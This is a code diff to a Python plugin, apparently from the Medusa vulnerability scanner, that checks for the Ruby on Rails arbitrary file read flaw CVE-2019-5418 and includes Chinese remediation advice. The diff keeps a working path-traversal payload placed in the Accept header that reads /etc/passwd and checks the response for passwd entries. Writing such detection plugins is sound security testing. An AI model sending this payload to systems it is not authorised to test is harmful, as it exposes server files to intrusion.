@@ -23,26 +23,14 @@ class VulnerabilityInfo(object):
         self.info['suggest'] = "1.推荐方案：升级Rails版本\r\n2.缓解方案：强制修改使用了renderfile:调用的代码，指定要渲染的文件格式（formats），避免不必要的文件泄露"  # 修复建议
         self.info['details'] = Medusa  # 结果
 
-def UrlProcessing(url):
-    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
-        res = urllib.parse.urlparse(url)
-    else:
-        res = urllib.parse.urlparse('http://%s' % url)
-    return res.scheme, res.hostname, res.port
 
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
-    proxies=ClassCongregation.Proxies().result(proxies)
-
-    scheme, url, port = UrlProcessing(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
+def medusa(**kwargs)->None:
+    url = kwargs.get("Url")  # 获取传入的url参数
+    Headers = kwargs.get("Headers")  # 获取传入的头文件
+    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
     try:
         payload = "../../../../../../../../etc/passwd{{"
-        payload_url = scheme + "://" + url +":"+ str(port) + "/robots"
+        payload_url = url + "/robots"
 
         Headers['Accept']=payload
         Headers['Content-Type']='application/x-www-form-urlencoded'
@@ -55,7 +43,7 @@ def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
         if code== 200 and con.find('root:') != -1 and con.find('bin:') != -1 and con.find('sys:') != -1 and con.find('sync:') != -1 :
             Medusa = "{} 存在RubyOnRails任意文件读取(CVE-2019-5418)\r\n漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}".format(url,payload_url,con.encode(encoding='utf-8'))
             _t=VulnerabilityInfo(Medusa)
-            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
+            ClassCongregation.VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
             ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
